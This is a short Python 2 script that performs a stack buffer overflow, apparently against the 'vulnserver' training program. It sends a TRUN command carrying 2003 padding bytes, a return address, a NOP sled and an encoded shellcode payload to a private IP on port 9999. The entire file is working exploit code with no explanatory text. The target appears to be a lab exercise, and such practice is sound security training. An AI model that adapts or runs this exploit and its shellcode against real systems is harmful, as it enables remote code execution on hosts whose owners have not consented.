#/usr/bin/python
import sys, socket

overflow = (
"\xdb\xc3\xbe\xe9\x59\xc8\x86\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x77\x17\x03\x77\x17\x83\x2e\x5d\x2a\x73\x4c\xb6\x28"
"\x7c\xac\x47\x4d\xf4\x49\x76\x4d\x62\x1a\x29\x7d\xe0\x4e\xc6"
"\xf6\xa4\x7a\x5d\x7a\x61\x8d\xd6\x31\x57\xa0\xe7\x6a\xab\xa3"
"\x6b\x71\xf8\x03\x55\xba\x0d\x42\x92\xa7\xfc\x16\x4b\xa3\x53"
"\x86\xf8\xf9\x6f\x2d\xb2\xec\xf7\xd2\x03\x0e\xd9\x45\x1f\x49"
"\xf9\x64\xcc\xe1\xb0\x7e\x11\xcf\x0b\xf5\xe1\xbb\x8d\xdf\x3b"
"\x43\x21\x1e\xf4\xb6\x3b\x67\x33\x29\x4e\x91\x47\xd4\x49\x66"
"\x35\x02\xdf\x7c\x9d\xc1\x47\x58\x1f\x05\x11\x2b\x13\xe2\x55"
"\x73\x30\xf5\xba\x08\x4c\x7e\x3d\xde\xc4\xc4\x1a\xfa\x8d\x9f"
"\x03\x5b\x68\x71\x3b\xbb\xd3\x2e\x99\xb0\xfe\x3b\x90\x9b\x96"
"\x88\x99\x23\x67\x87\xaa\x50\x55\x08\x01\xfe\xd5\xc1\x8f\xf9"
"\x1a\xf8\x68\x95\xe4\x03\x89\xbc\x22\x57\xd9\xd6\x83\xd8\xb2"
"\x26\x2b\x0d\x14\x76\x83\xfe\xd5\x26\x63\xaf\xbd\x2c\x6c\x90"
"\xde\x4f\xa6\xb9\x75\xaa\x21\x06\x21\x32\x35\xee\x30\x3a\x27"
"\xb3\xbd\xdc\x2d\x5b\xe8\x77\xda\xc2\xb1\x03\x7b\x0a\x6c\x6e"
"\xbb\x80\x83\x8f\x72\x61\xe9\x83\xe3\x81\xa4\xf9\xa2\x9e\x12"
"\x95\x29\x0c\xf9\x65\x27\x2d\x56\x32\x60\x83\xaf\xd6\x9c\xba"
"\x19\xc4\x5c\x5a\x61\x4c\xbb\x9f\x6c\x4d\x4e\x9b\x4a\x5d\x96"
"\x24\xd7\x09\x46\x73\x81\xe7\x20\x2d\x63\x51\xfb\x82\x2d\x35"
"\x7a\xe9\xed\x43\x83\x24\x98\xab\x32\x91\xdd\xd4\xfb\x75\xea"
"\xad\xe1\xe5\x15\x64\xa2\x06\xf4\xac\xdf\xae\xa1\x25\x62\xb3"
"\x51\x90\xa1\xca\xd1\x10\x5a\x29\xc9\x51\x5f\x75\x4d\x8a\x2d"
"\xe6\x38\xac\x82\x07\x69")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.0.136',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
